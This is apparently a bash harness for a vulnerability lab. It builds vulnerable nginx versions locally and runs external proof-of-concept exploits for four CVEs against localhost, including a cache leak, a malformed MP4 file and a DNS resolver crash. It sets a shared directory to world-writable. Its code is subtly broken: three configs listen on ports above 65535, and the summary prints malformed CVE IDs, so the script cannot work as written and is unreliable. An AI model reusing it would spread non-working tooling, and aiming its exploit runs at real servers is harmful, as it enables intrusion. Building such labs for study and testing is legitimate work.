#!/usr/bin/env bash
set -euo pipefail
LAB="$HOME/nginx-poc-lab"
POCLAB="/mnt/d/download/PoClab/PoCLab"
mkdir -p "$LAB"
export PATH="$LAB/bin:$PATH"

ensure_pcre8() {
    local p="$LAB/pcre-8.45"
    if [ ! -d "$p" ]; then
        echo "[*] download PCRE 8.45 for old nginx builds"
        wget -q -O "$LAB/pcre-8.45.tar.gz" \
            "https://downloads.sourceforge.net/project/pcre/pcre/8.45/pcre-8.45.tar.gz"
        tar -xf "$LAB/pcre-8.45.tar.gz" -C "$LAB"
    fi
}

build_nginx() {
    local ver="$1"
    shift
    local prefix="$LAB/nginx-$ver"
    if [ -x "$prefix/sbin/nginx" ]; then
        echo "[=] nginx $ver already built"
        return 0
    fi
    local src="$LAB/nginx-$ver-src"
    if [ ! -d "$src" ]; then
        echo "[*] download nginx-$ver"
        wget -q -O "$LAB/nginx-$ver.tar.gz" "https://nginx.org/download/nginx-$ver.tar.gz"
        tar -xf "$LAB/nginx-$ver.tar.gz" -C "$LAB"
        mv "$LAB/nginx-$ver" "$src"
    fi
    echo "[*] configure/build nginx-$ver"
    cd "$src"
    local cfg=(--prefix="$prefix")
    local major minor
    major="${ver%%.*}"
    minor="${ver#*.}"; minor="${minor%%.*}"
    if [ "$major" -lt 1 ] || { [ "$major" -eq 1 ] && [ "$minor" -lt 25 ]; }; then
        ensure_pcre8
        cfg+=(--with-pcre="$LAB/pcre-8.45")
        cfg+=(--with-cc-opt="-Wno-error=cast-function-type -Wno-cast-function-type")
    else
        cfg+=(--with-pcre2)
    fi
    cfg+=("$@")
    if grep -q 'current_salt' "$src/src/os/unix/ngx_user.c" 2>/dev/null; then
        sed -i 's/cd\.current_salt\[0\] = ~salt\[0\];/cd.initialized = 0;/' "$src/src/os/unix/ngx_user.c"
    fi
    rm -rf "$src/objs"
    if ! ./configure "${cfg[@]}" >"$LAB/configure-$ver.log" 2>&1; then
        tail -20 "$LAB/configure-$ver.log"
        return 1
    fi
    make -j"$(nproc)" >"$LAB/make-$ver.log" 2>&1
    make install >>"$LAB/make-$ver.log" 2>&1
}

stop_nginx() {
    pkill -f "$LAB/nginx-" 2>/dev/null || true
    pkill -f "backend-7529.py" 2>/dev/null || true
    sleep 1
}

run_case() {
    local id="$1"
    shift
    echo ""
    echo "======== $id ========"
    "$@" >"$LAB/$id.log" 2>&1
    local rc=$?
    echo "--- output (tail) ---"
    tail -20 "$LAB/$id.log"
    echo "--- exit $rc ---"
    return $rc
}

mkdir -p "$LAB/conf" "$LAB/www" "$LAB/cache" "$LAB/dav"

echo "AAAA test content for cache leak CVE-2017-7529" >"$LAB/www/index.html"
python3 "$POCLAB/pocs/CVE-2022-41741/poc.py" --write "$LAB/www/evil.mp4" >/dev/null

build_nginx 1.13.2
build_nginx 1.20.0
build_nginx 1.23.1 --with-http_mp4_module
build_nginx 1.29.6 --with-http_dav_module

cat >"$LAB/backend-7529.py" <<'PY'
from http.server import BaseHTTPRequestHandler, HTTPServer
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.end_headers()
        self.wfile.write(b"AAAA test content for cache leak CVE-2017-7529\n")
    def log_message(self, *a): pass
HTTPServer(("127.0.0.1", 18081), H).serve_forever()
PY

cat >"$LAB/conf/7529.conf" <<EOF
worker_processes 1;
error_log $LAB/7529-error.log info;
pid $LAB/7529.pid;
events { worker_connections 64; }
http {
    proxy_cache_path $LAB/cache levels=1:2 keys_zone=c:10m;
    upstream b { server 127.0.0.1:18081; }
    server {
        listen 17529;
        location / {
            proxy_cache c;
            proxy_pass http://b;
        }
    }
}
EOF

cat >"$LAB/conf/41741.conf" <<EOF
worker_processes 1;
error_log $LAB/41741-error.log info;
pid $LAB/41741.pid;
events { worker_connections 64; }
http {
    server {
        listen 141741;
        location / {
            root $LAB/www;
            mp4;
        }
    }
}
EOF

cat >"$LAB/conf/27654.conf" <<EOF
worker_processes 1;
error_log $LAB/27654-error.log info;
pid $LAB/27654.pid;
events { worker_connections 64; }
http {
    server {
        listen 127654;
        client_max_body_size 1m;
        location /uploads/ {
            alias /data/files/;
            dav_methods PUT DELETE MKCOL COPY MOVE;
            create_full_put_path on;
        }
    }
}
EOF

mkdir -p /data/files
chmod 777 /data/files 2>/dev/null || sudo mkdir -p /data/files && sudo chmod 777 /data/files

test_7529() {
    stop_nginx
    python3 "$LAB/backend-7529.py" &
    sleep 1
    "$LAB/nginx-1.13.2/sbin/nginx" -c "$LAB/conf/7529.conf"
    curl -sf "http://127.0.0.1:17529/" >/dev/null
    curl -sf "http://127.0.0.1:17529/" >/dev/null
    python3 "$POCLAB/pocs/CVE-2017-7529/poc.py" "http://127.0.0.1:17529/"
}

test_41741() {
    stop_nginx
    "$LAB/nginx-1.23.1/sbin/nginx" -c "$LAB/conf/41741.conf"
    python3 "$POCLAB/pocs/CVE-2022-41741/poc.py" "http://127.0.0.1:141741/evil.mp4"
}

test_27654() {
    stop_nginx
    rm -rf /data/files/*
    "$LAB/nginx-1.29.6/sbin/nginx" -c "$LAB/conf/27654.conf"
    python3 "$POCLAB/pocs/CVE-2026-27654/poc.py" "http://127.0.0.1:127654"
}

test_23017() {
    stop_nginx
    if [ "$(id -u)" -ne 0 ]; then
        echo "[-] need root for scapy (run: sudo bash $0)"
        return 2
    fi
    python3 -c "import scapy" 2>/dev/null || pip3 install -q scapy
    cat >"$LAB/conf/23017.conf" <<EOF
worker_processes 1;
error_log $LAB/23017-error.log info;
pid $LAB/23017.pid;
events { worker_connections 64; }
http {
    resolver 127.0.0.53 valid=30s ipv6=off;
    server {
        listen 123017;
        location / {
            set \$u "http://resolve.test/";
            proxy_pass \$u;
        }
    }
}
EOF
    if ! command -v dnsmasq >/dev/null; then
        apt-get install -y -qq dnsmasq >/dev/null 2>&1 || true
    fi
    pkill dnsmasq 2>/dev/null || true
    dnsmasq --keep-in-foreground --port=53 --listen-address=127.0.0.53 --no-hosts --no-resolv &
    dns_pid=$!
    sleep 1
    "$LAB/nginx-1.20.0/sbin/nginx" -c "$LAB/conf/23017.conf"
    timeout 20 python3 "$POCLAB/pocs/CVE-2021-23017/poc.py" -t 127.0.0.1 -r 127.0.0.53 &
    poc_pid=$!
    sleep 2
    curl -sf --max-time 5 "http://127.0.0.1:123017/" >/dev/null || true
    wait $poc_pid; rc=$?
    kill $dns_pid 2>/dev/null || true
    if grep -qE "signal 11|exited on signal|alert" "$LAB/23017-error.log" 2>/dev/null; then return 0; fi
    if [ "$rc" -eq 0 ]; then return 0; fi
    return 1
}

declare -A RC
run_case CVE-2017-7529 test_7529; RC[7529]=$?
run_case CVE-2022-41741 test_41741; RC[41741]=$?
run_case CVE-2026-27654 test_27654; RC[27654]=$?
run_case CVE-2021-23017 test_23017; RC[23017]=$?
stop_nginx

echo ""
echo "======== SUMMARY ========"
for k in 7529 41741 27654 23017; do
    echo "CVE-20$k: exit ${RC[$k]}"
done
